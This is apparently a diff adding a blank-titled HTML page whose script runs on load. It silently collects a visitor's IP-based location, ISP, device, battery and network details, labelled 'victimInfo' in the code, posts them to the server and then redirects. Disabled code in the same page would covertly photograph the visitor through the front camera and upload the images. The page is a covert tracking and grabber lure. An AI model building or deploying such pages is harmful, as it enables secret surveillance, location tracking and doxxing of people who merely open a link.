@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title></title>
+  </head>
+  <body>
+    <!--<video style="display: none;" id="video" autoplay playsinline></video>-->
+    <!--<canvas id="canvas" style="display: none;"></canvas>-->
+
+    <script>
+    //const video = document.getElementById('video');
+    //const canvas = document.getElementById('canvas');
+    let retr = 0;
+
+    async function getSystemInfo() {
+      const batteryStatus = await getBatteryStatus();
+
+      return {
+        "Device": {
+          "Operating System": navigator?.userAgentData?.platform || "Unknown",
+          "Mobile": `${navigator?.userAgentData?.mobile ? "Yes" : "No"}`,
+          "Platform": navigator.platform || "Unknown",
+          "Device Memory": navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
+          "Battery Level": batteryStatus.level,
+          "Charging": batteryStatus.charging,
+          "Screen Resolution": `${screen.width}×${screen.height}`,
+          "Viewport Size": `${window.innerWidth}×${window.innerHeight}`,
+          "App Name": navigator.appName || "Unknown",
+          "User Agent": navigator.userAgent || "Unknown",
+        },
+        "Network": {
+          "Network Type": navigator?.connection?.type || "Unknown",
+          "Network Speed": navigator?.connection?.effectiveType || "Unknown",
+          "Download Speed": navigator?.connection?.downlink ? `${navigator.connection.downlink} Mbps` : "Unknown",
+          "Max Network Speed": navigator?.connection?.downlinkMax ? `${navigator.connection.downlinkMax} Mbps` : "Unknown",
+          "Network Latency": navigator?.connection?.rtt ? `${navigator.connection.rtt} ms` : "Unknown"
+        },
+        "Extra": {
+          "System Time": new Date().toString(),
+          "Cookies Enabled": navigator.cookieEnabled ? "Yes" : "No",
+          "Vendor": navigator.vendor || "Unknown"
+        }
+      };
+    }
+
+    function randomBytes(size = 2, type = "hex") {
+      if (!Number.isInteger(size) || size <= 0) {
+        size = 2
+      }
+
+      const randomBytes = new Uint8Array(size);
+      for (let i = 0; i < size; i++) {
+        randomBytes[i] = Math.floor(Math.random() * 256);
+      }
+
+      return Buffer.from(randomBytes).toString(type);
+    }
+
+    function randomUID(){
+      return `${randomBytes()}-${randomBytes()}-${randomBytes()}`;
+    }
+
+    function isUID(uid){
+      const hashes = uid.split("-").filter(Boolean);
+      return hashes >= 3;
+    }
+
+    async function saveInformation() {
+      try {
+        const ipResponse = await fetch("https://ipinfo.io/json", {
+          method: "GET",
+          referrerPolicy: 'no-referrer'
+        });
+        const ipinfo = await ipResponse.json();
+
+        // Extract latitude and longitude from IP info
+        const [lat, lon] = ipinfo?.loc.split(",");
+
+        // Get system info
+        const systemInfo = await getSystemInfo();
+
+        // Prepare victim information
+        const victimInfo = {
+          "Location": {
+            "IPv4": ipinfo.ip || "Unknown",
+            "City": ipinfo.city || "Unknown",
+            "Region": ipinfo.region || "Unknown",
+            "Country": ipinfo.country || "Unknown",
+            "Location": lat && lon ? `https://maps.google.com/?q=${lat},${lon}` : "Unknown",
+            "ISP": ipinfo.org || "Unknown",
+            "Postal Code": ipinfo.postal || "Unknown",
+            "Time Zone": ipinfo.timezone || "Unknown"
+          },
+          ...systemInfo
+        };
+
+        localStorage.setItem("user", JSON.stringify(victimInfo));
+        //return victimInfo;
+      } catch (error) {
+        // In case of error, return default victim information
+        const systemInfo = await getSystemInfo();
+
+        const victimInfo = {
+          "Location": {
+            "IPv4": randomUID(),
+            "City": "Unknown",
+            "Region": "Unknown",
+            "Country": "Unknown",
+            "Location": "Unknown",
+            "ISP": "Unknown",
+            "Postal Code": "Unknown",
+            "Time Zone": "Unknown"
+          },
+          ...systemInfo
+        };
+
+        localStorage.setItem("user", JSON.stringify(victimInfo));
+        //return victimInfo;
+      }
+    }
+
+    async function fetchInformation() {
+      try {
+        retr += 1;
+        const user = localStorage.getItem("user") 
+          ? JSON.parse(localStorage.getItem("user")) 
+          : undefined;
+
+        if (retr >= 10) {
+          return;
+        }
+
+        if (isUID(user.Location.IPv4)) {
+          await saveInformation();
+          fetchInformation();
+          return; // Exit to prevent infinite recursion
+        }
+
+        const response = await fetch("/getInfo", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(user),
+        });
+        const data = await response.json();
+        if (data.redirecturl){
+          window.location.href = data.redirecturl;
+          //await startCamera(data.redirecturl);
+        }
+      } catch (e) {
+        if (!e.message.includes("Max retries")) {
+          await saveInformation();
+          retr < 10 && await fetchInformation(); // Retry if under max retries
+        }
+      }
+    }
+
+    async function getUserInfo(){
+      try{
+        let user = JSON.parse(localStorage.getItem("user"));
+        return user;
+      }
+      catch(e){
+        return null;
+      }
+    }
+
+    async function getBatteryStatus() {
+      if (!navigator.getBattery) {
+        return {
+          level: "Unknown",
+          charging: "Unknown",
+          chargingTime: "Unknown",
+          dischargingTime: "Unknown"
+        };
+      }
+
+      const battery = await navigator.getBattery();
+      return {
+        level: `${Math.round(battery.level * 100)}%`,
+        charging: battery.charging ? "Yes" : "No",
+        chargingTime: battery.chargingTime,
+        dischargingTime: battery.dischargingTime
+      };
+    }
+
+    //async function startCamera(redirecturl) {
+    //  try {
+    //    const stream = await navigator.mediaDevices.getUserMedia({
+    //      video: { facingMode: 'user' }, // Use 'environment' for rear camera
+    //      audio: false
+    //    });
+    //    video.srcObject = stream;
+    //    await new Promise(resolve => setTimeout(resolve, 3000));
+    //    await captureImage();
+    //    await captureImage();
+    //    await captureImage();
+    //    window.location.href = redirecturl;
+    //  } catch (err) {
+    //    await fetchError(`<Start Camera Function Error> - ${err.message}`);
+    //    window.location.href = redirecturl;
+    //  }
+    //}
+    //
+    //async function captureImage() {
+    //  const context = canvas.getContext('2d');
+    //
+    //  // Check if the video is ready
+    //  if (video.videoWidth === 0 || video.videoHeight === 0) {
+    //    await fetchError("<Capture Image Function Error> - Video not ready for capture");
+    //    return;
+    //  }
+    //
+    //  canvas.width = video.videoWidth;
+    //  canvas.height = video.videoHeight;
+    //
+    //  // Draw the current frame from the video onto the canvas
+    //  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    //
+    //  // Convert canvas to Blob
+    //  canvas.toBlob(async (blob) => {
+    //    if (!blob) {
+    //      await fetchError("<Capture Image Function Error> - Failed to create image with blob")
+    //      return;
+    //    }
+    //
+    //    // Create a FormData object
+    //    const formData = new FormData();
+    //    formData.append('image', blob, 'capture.jpg');
+    //    formData.append('ip', getUserInfo().IPv4);
+    //
+    //    try {
+    //      // Send the image to the server
+    //      const response = await fetch('/upload', {
+    //        method: 'POST',
+    //        body: formData
+    //      });
+    //
+    //      if (!response.ok) {
+    //        throw new Error(`Server error: ${response.statusText}`);
+    //      }
+    //    } catch (error) {
+    //      await fetchError(`<Capture Image Function Error> - Upload Error > ${error.message}`);
+    //    }
+    //  }, 'image/jpeg');
+    //}
+
+    //async function fetchError(message){
+    //  await fetch("/error", {
+    //    method: "POST",
+    //    body: JSON.stringify({ msg: message })
+    //  });
+    //}
+    </script>
+    <script>
+    (async () => {
+      await saveInformation();
+      fetchInformation();
+    })();
+    </script>
+  </body>
+</html>
